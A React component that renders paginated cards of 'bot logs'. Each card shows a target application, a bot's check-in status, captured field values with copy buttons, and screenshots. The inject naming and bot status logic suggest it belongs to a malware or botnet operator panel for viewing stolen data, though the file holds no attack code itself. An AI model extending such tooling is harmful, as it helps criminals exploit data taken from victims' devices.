import React, {Dispatch, SetStateAction} from "react";
import {BotLog} from "../../Model/BotLog";
import {Alert, Button, Checkbox, Col, Divider, Image, Input, Pagination, Result, Row, Space, Tag} from "antd";
import {useTranslation} from "react-i18next";
import {AppState} from "../../Store/RootReducer";
import {Key} from "antd/es/table/interface";
import CopyToClipboard from "react-copy-to-clipboard";
import {successNotify} from "../../Util/config";
import {DeleteFilled, EditFilled} from "@ant-design/icons";
import Spinner from "./Spinner";
import {useAppSelector} from "../../Hook/useAppSelector";
import moment from "moment";
import {NavLink} from "react-router-dom";

interface BotLogCardProps {
    log: BotLog[],
    comment: boolean,
    setComment: Dispatch<SetStateAction<boolean>>
    delete: boolean,
    setDelete: Dispatch<SetStateAction<boolean>>,
    logIds: number[],
    setLogIds: Dispatch<SetStateAction<number[]>>,
    selectedChange: (selectedRowKeys: Key[]) => void,
    paginationHandler: (pageNumber: number, size: number) => void,
    isLoaded: boolean,
}

const BotLogsCard: React.FC<BotLogCardProps> = (props: BotLogCardProps) => {
    const {t} = useTranslation();
    const logsReducer = useAppSelector((state: AppState) => state.logs);

    return (
        <>
            {props.isLoaded && (
                <Pagination
                    current={logsReducer.page}
                    total={logsReducer.total}
                    defaultPageSize={logsReducer.per_page}
                    onChange={props.paginationHandler}
                    showSizeChanger={true}
                    locale={{
                        items_per_page: "",
                    }}
                    style={{
                        marginBottom: 15,
                    }}
                    pageSizeOptions={[4, 8, 16, 32, 64]}
                />
            )}

            {props.isLoaded ? (
                <Row gutter={15}>
                    {props.log.length > 0 ? props.log.map((log) => {
                        const lastConnectionDiff = moment().diff(moment(log.bot?.updated_at)) / 1000;
                        const lastConnectionStatus = lastConnectionDiff <= 60 ? "online" : (lastConnectionDiff >= 144000 ? "uninstalled" : "offline");

                        return (
                            <Col xxl={6} xl={8} md={12} sm={24} xs={24} key={log.id} style={{marginBottom: 15}}>
                                <div className="inject-card">
                                    <div>
                                        <div className="inject-head" style={{marginTop: 0}}>
                                            <div>
                                                <div>
                                                    <Space>
                                                        <div className="app-icon" style={{
                                                            backgroundImage: "url()",
                                                        }}/>

                                                        <span>{log.application}</span>
                                                    </Space>
                                                </div>
                                                <Space className="text-ellipsis">
                                                    <Checkbox
                                                        checked={props.logIds.includes(log.id)}
                                                        onChange={(event) => {
                                                            if (event.target.checked) {
                                                                props.setLogIds([...props.logIds, log.id]);
                                                            } else {
                                                                props.setLogIds(props.logIds.filter((logId) => logId !== log.id));
                                                            }
                                                        }}
                                                    />
                                                    <span>ID: [#{log.id}]</span>
                                                </Space>
                                            </div>
                                        </div>
                                        <div className="inject-bot-info">
                                            <div>
                                                <NavLink
                                                    to={`/bots?bot_ids=${log.bot_id}`}
                                                >
                                                    {log.bot_id}
                                                </NavLink>
                                            </div>
                                            <Space>
                                                <span className={"inject-bot-status " + lastConnectionStatus}>
                                                    {lastConnectionStatus}
                                                </span>
                                                <Tag className={"bot-item-tag"}>
                                                    {log.bot?.tag}
                                                </Tag>
                                            </Space>
                                        </div>
                                        <div className="inject-content">
                                            {log.comment && (
                                                <Alert
                                                    type={"success"}
                                                    description={log.comment}
                                                    icon={(
                                                        <span className="anticon">
                                                            <i
                                                                className="fa-regular fa-message"
                                                                style={{color: "#fff", fontSize: 18}}
                                                            />
                                                        </span>
                                                    )}
                                                    showIcon={true}
                                                    style={{padding: "9px 4px 4px 9px", marginTop: 15}}
                                                />
                                            )}

                                            <div>
                                                <div className="inject-data">
                                                    <Divider orientation="center" style={{margin: "15px 0 0"}}>
                                                        {t("DATA")}
                                                    </Divider>
                                                    <div className="inject-data-inner">
                                                        <div><b>{t("DATE")}</b>: {log.created_at}</div>
                                                        <br/>
                                                        {Object.keys(log.log).filter((item) => item !== "additional").map((itemLog, key) => {
                                                            const itemLogValue = log.log[itemLog] as string;

                                                            return (
                                                                <Input.Group key={key}>
                                                                    <Input
                                                                        addonBefore={itemLog}
                                                                        value={itemLogValue}
                                                                        readOnly={true}
                                                                        style={{
                                                                            width: "calc(100% - 33px)",
                                                                        }}
                                                                    />
                                                                    <CopyToClipboard
                                                                        text={itemLogValue}
                                                                        onCopy={() => successNotify(t("SUCCESS"), t("COPIED"))}
                                                                    >
                                                                        <Button
                                                                            icon={(
                                                                                <span className="anticon">
                                                                                    <i className="fa-solid fa-paste"/>
                                                                                </span>
                                                                            )}
                                                                            type="primary"
                                                                            onClick={() => {

                                                                            }}
                                                                        />
                                                                    </CopyToClipboard>
                                                                </Input.Group>
                                                            );
                                                        })}
                                                    </div>

                                                    {log.log.additional && (
                                                        <Divider orientation="center" style={{margin: "15px 0 0"}}>
                                                            {t("LOG_COLUMN_ADDITIONAL")}
                                                        </Divider>
                                                    )}

                                                    <div className="inject-data-inner">
                                                        {log.log.additional && Object.keys(log.log.additional).map((item, key) => {
                                                            const additionalData = log.log.additional as any;

                                                            if (additionalData[item].includes("data:image")) {
                                                                return (
                                                                    <Image.PreviewGroup key={log.id}>
                                                                        <div className="screen-grid-item">
                                                                            <Image src={additionalData[item]}/>
                                                                        </div>
                                                                    </Image.PreviewGroup>
                                                                );
                                                            }

                                                            return (
                                                                <Input.Group key={key}>
                                                                    <Input
                                                                        addonBefore={item}
                                                                        value={additionalData[item]}
                                                                        readOnly={true}
                                                                        style={{
                                                                            width: "calc(100% - 33px)",
                                                                        }}
                                                                    />
                                                                    <Button
                                                                        icon={(
                                                                            <span className="anticon">
                                                                                <i className="fa-solid fa-paste"/>
                                                                            </span>
                                                                        )}
                                                                        type="primary"
                                                                    />
                                                                </Input.Group>
                                                            );
                                                        })}
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <div>
                                        <Divider orientation="center" style={{margin: "15px 0 5px"}}>
                                            {t("INJ_COLUMN_ACTIONS")}
                                        </Divider>
                                        <Space style={{width: "100%", justifyContent: "space-between"}}>
                                            <Button
                                                type="primary"
                                                icon={<EditFilled/>}
                                                onClick={() => {
                                                    props.setLogIds([log.id]);
                                                    props.setComment(true);
                                                }}
                                            >
                                                {t("COMMENT")}
                                            </Button>

                                            <Button
                                                type="primary"
                                                icon={<DeleteFilled/>}
                                                danger
                                                onClick={() => {
                                                    props.setLogIds([log.id]);
                                                    props.setDelete(true);
                                                }}
                                            />
                                        </Space>
                                    </div>
                                </div>
                            </Col>
                        );
                    }) : (
                        <Col span={24}>
                            <div className="bots-list-404">
                                <Result
                                    status="warning"
                                    title={t("LOGS_NOT_FOUND_TITLE")}
                                    subTitle={t("LOGS_NOT_FOUND_DESCRIPTION")}
                                    icon={<i className="fa-solid fa-robot"/>}
                                />
                            </div>
                        </Col>
                    )}
                </Row>
            ) : (
                <Spinner/>
            )}

            <br/>

            {props.isLoaded && (
                <Pagination
                    current={logsReducer.page}
                    total={logsReducer.total}
                    defaultPageSize={logsReducer.per_page}
                    onChange={props.paginationHandler}
                    showSizeChanger={true}
                    locale={{
                        items_per_page: "",
                    }}
                />
            )}
        </>
    );
};

export default BotLogsCard;
